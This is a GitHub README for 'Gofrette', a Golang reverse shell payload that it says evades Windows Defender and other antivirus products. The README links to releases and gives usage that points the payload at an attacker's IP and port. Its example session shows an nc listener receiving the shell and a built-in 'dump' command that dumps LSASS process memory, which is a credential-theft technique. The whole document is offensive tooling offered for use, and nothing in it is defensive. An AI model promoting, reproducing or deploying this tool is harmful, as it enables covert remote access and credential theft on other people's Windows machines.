
<p align="center">
  <a href="" rel="noopener">
 <img width=200px height=200px src="https://cdn-icons-png.flaticon.com/512/1076/1076284.png"> </a>
</p>


# Gofrette

Gofrette is a reverse shell payload developed in Golang that bypasses Windows defender and many others anti-virus.
<p align="center">
  <a href="" rel="noopener">
 <img src="https://antiscan.me/images/result/aB0uZL38cghZ.png
"> </a>


## Releases
https://github.com/Enelg52/Gofrette/releases

## Usage

```bash
.\gofrette.exe -a [ipadress] -p [port]
```

## Example
````raw
//target
PS C:\Users\enelg> go run .\gofrette.go -a 127.0.0.1 -p 1234
Connected... :)
````

```raw
//attacker
❯ rlwrap nc -lvnp 1234
Listening on 0.0.0.0 1234
Connection received on 127.0.0.1 37458
C:\Users\enelg>help
exit : exit terminal
dump : dump lsass in /tmp
C:\Users\enelg>dump
[+] Get process id
[+] Dump process 900
[+] Process dumped
[+] The dump is under C:\temp\lsass.dmp
C:\Users\yanng>
```


## Contributing
Pull requests are welcome !
